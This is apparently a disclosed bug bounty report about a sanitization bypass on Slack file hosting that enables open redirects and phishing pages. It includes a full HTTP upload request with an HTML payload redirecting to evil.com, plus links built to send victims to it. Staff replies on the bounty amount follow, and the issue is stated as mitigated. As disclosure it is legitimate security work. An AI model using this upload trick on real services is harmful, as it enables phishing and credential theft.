title: Open Redirect on slack.com

profile.name: Slack
profile.about: All your team communication in one place, instantly searchable, and available wherever you go.

vulnerability_information:
Hi, my report has tow interesting parts here
First
======
In this report #104087 the attacker uploads a svg file to execute JavaScript and redirect to any domain
I have found a new way to execute full html files on victim machine instead of downloading them by adding a bunch of binary chars before html code

### Please have a look at screenshots attached here to get what I mean.
### Steps
1. login to your account and send the following request:

Note: I can't get binary chars displayed here so I attached a file containing the whole request

```
POST /api/files.uploadAsync HTTP/1.1
Host: upload.slack.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Length: 886
Content-Type: multipart/form-data; boundary=---------------------------89481407720596
Origin: https://<subdomain>.slack.com
Connection: keep-alive

-----------------------------89481407720596
Content-Disposition: form-data; name="file"; filename="pixel.png"
Content-Type: text/html

<bunch_of_binary_chars_here>
<html>
<script>
window.location='http://www.evil.com';
</script>
</html>
-----------------------------89481407720596
Content-Disposition: form-data; name="filename"

pixel
-----------------------------89481407720596
Content-Disposition: form-data; name="token"

<token>
-----------------------------89481407720596
Content-Disposition: form-data; name="channels"

<channels>
-----------------------------89481407720596
Content-Disposition: form-data; name="title"

pixel
-----------------------------89481407720596
Content-Disposition: form-data; name="initial_comment"

hi
-----------------------------89481407720596--

```

2. Make public link for "pixel" file "https://files.slack.com/files-pri/T1ARLSGBS-F1AU0FTGR/pixel?pub_secret=094ca97aee"

3. Complete link "https://slack.com/checkcookie?redir=https://files.slack.com/files-pri/T1ARLSGBS-F1AU0FTGR/pixel?pub_secret=094ca97aee"

4. Whenever a victim clicks the previous link he will get to "http://www.evil.com"

Second
======
I have found another way to make the redirect link very simple and more tricky
The attacker can just use slack main domain using this link "https://slack.com/files-pri/T1ARLSGBS-F1AU0FTGR/pixel?pub_secret=094ca97aee" to redirect victims to "http://www.evil.com".

There are many other attack scenarios can be achieved here cause the attacker has full control over file content and name also.

Here is a simple phishing login page I have created as PoC that could trick even advanced users to submit their credentials to the attacker "https://slack.com/files-pri/T1ARLSGBS-F1AVC33M5/login?pub_secret=e80f120635" 

Attacker could do tons of fun stuff to the files, to my mind come Viruses, Exploits, Illegal Content, etc.
vulnerability_information_html:
Hi, my report has tow interesting parts here

First

In this report #104087 the attacker uploads a svg file to execute JavaScript and redirect to any domain
I have found a new way to execute full html files on victim machine instead of downloading them by adding a bunch of binary chars before html code

Please have a look at screenshots attached here to get what I mean.

Steps

  1. login to your account and send the following request:

Note: I can't get binary chars displayed here so I attached a file containing the whole request

POST /api/files.uploadAsync HTTP/1.1
Host: upload.slack.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Length: 886
Content-Type: multipart/form-data; boundary=---------------------------89481407720596
Origin: https://<subdomain>.slack.com
Connection: keep-alive

-----------------------------89481407720596
Content-Disposition: form-data; name="file"; filename="pixel.png"
Content-Type: text/html

<bunch_of_binary_chars_here>
<html>
<script>
window.location='http://www.evil.com';
</script>
</html>
-----------------------------89481407720596
Content-Disposition: form-data; name="filename"

pixel
-----------------------------89481407720596
Content-Disposition: form-data; name="token"

<token>
-----------------------------89481407720596
Content-Disposition: form-data; name="channels"

<channels>
-----------------------------89481407720596
Content-Disposition: form-data; name="title"

pixel
-----------------------------89481407720596
Content-Disposition: form-data; name="initial_comment"

hi
-----------------------------89481407720596--

  1. Make public link for "pixel" file "https://files.slack.com/files-pri/T1ARLSGBS-F1AU0FTGR/pixel?pub_secret=094ca97aee"

  2. Complete link "https://slack.com/checkcookie?redir=https://files.slack.com/files-pri/T1ARLSGBS-F1AU0FTGR/pixel?pub_secret=094ca97aee"

  3. Whenever a victim clicks the previous link he will get to "http://www.evil.com"

Second

I have found another way to make the redirect link very simple and more tricky
The attacker can just use slack main domain using this link "https://slack.com/files-pri/T1ARLSGBS-F1AU0FTGR/pixel?pub_secret=094ca97aee" to redirect victims to "http://www.evil.com".

There are many other attack scenarios can be achieved here cause the attacker has full control over file content and name also.

Here is a simple phishing login page I have created as PoC that could trick even advanced users to submit their credentials to the attacker "https://slack.com/files-pri/T1ARLSGBS-F1AVC33M5/login?pub_secret=e80f120635"

Attacker could do tons of fun stuff to the files, to my mind come Viruses, Exploits, Illegal Content, etc.

activities.message:
Please note:
------------------
The first link (I got from #104087) "https://slack.com/checkcookie?redir=https://files.slack.com/files-pri/T1ARLSGBS-F1AU0FTGR/pixel?pub_secret=094ca97aee" works only if the victim is logged in.

While the other one "https://slack.com/files-pri/T1ARLSGBS-F1AU0FTGR/pixel?pub_secret=094ca97aee" will always work regardless of login status.
activities.markdown_message:
Please note:

The first link (I got from #104087) "https://slack.com/checkcookie?redir=https://files.slack.com/files-pri/T1ARLSGBS-F1AU0FTGR/pixel?pub_secret=094ca97aee" works only if the victim is logged in.

While the other one "https://slack.com/files-pri/T1ARLSGBS-F1AU0FTGR/pixel?pub_secret=094ca97aee" will always work regardless of login status.

Here is the public link of the "pix" file https://slack.com/files-pri/T1ARLSGBS-F1D23BLBD/pix?pub_secret=a6ff457a49

##Please note that I'm submitting the file "Content-Type" as "text/html" and "filename" without extension
Please see the attachments for more clarification.
Thanks;

additional_data.old_title: XSS and Open Redirect on slack.com

activities.message:
Hi @maxfeldman ,
Having another look at #104087 , I noticed that the bounty is $1000 but my report got only $500 while it has the same impact as #104087 . 
I respect your decision but I am just a little bit confused.

Thanks!
activities.markdown_message:
Hi @maxfeldman ,
Having another look at #104087 , I noticed that the bounty is $1000 but my report got only $500 while it has the same impact as #104087 .
I respect your decision but I am just a little bit confused.

Thanks!

activities.message:
Hi @sudotop,

Sorry for the confusion here - basically, report #104087 resulted in us making a bigger/more systemic fix, so we factored in an additional bounty amount. This report was indeed a bypass, but the fix in this case was smaller so we awarded within our normal reward range. I hope that clarifies things, and thank you again for the report.

Thank you!
Max
activities.markdown_message:
Hi @sudotop,

Sorry for the confusion here - basically, report #104087 resulted in us making a bigger/more systemic fix, so we factored in an additional bounty amount. This report was indeed a bypass, but the fix in this case was smaller so we awarded within our normal reward range. I hope that clarifies things, and thank you again for the report.

Thank you!
Max

activities.message:
Hi Max
I thought bounties are decided based on report impact regardless of fix size. Thanks for your reply anyway.
activities.markdown_message:
Hi Max
I thought bounties are decided based on report impact regardless of fix size. Thanks for your reply anyway.

activities.message:
Hi @sudotop,

You are correct - bounties are decided based on impact. However, we will occasionally reward an *additional* amount for reports which reveal other issues or which are particularly interesting. This was the case for the other report.

Thanks,
Max
activities.markdown_message:
Hi @sudotop,

You are correct - bounties are decided based on impact. However, we will occasionally reward an additional amount for reports which reveal other issues or which are particularly interesting. This was the case for the other report.

Thanks,
Max

summaries.content: @sudotop discovered a bypass of our sanitization on slack-files.com, which could be combined with a particular file-sharing link from the slack domain to lead to an open redirect. Slack has mitigated this bypass. Thanks @sudotop!
summaries.content_html: @sudotop discovered a bypass of our sanitization on slack-files.com, which could be combined with a particular file-sharing link from the slack domain to lead to an open redirect. Slack has mitigated this bypass. Thanks @sudotop!
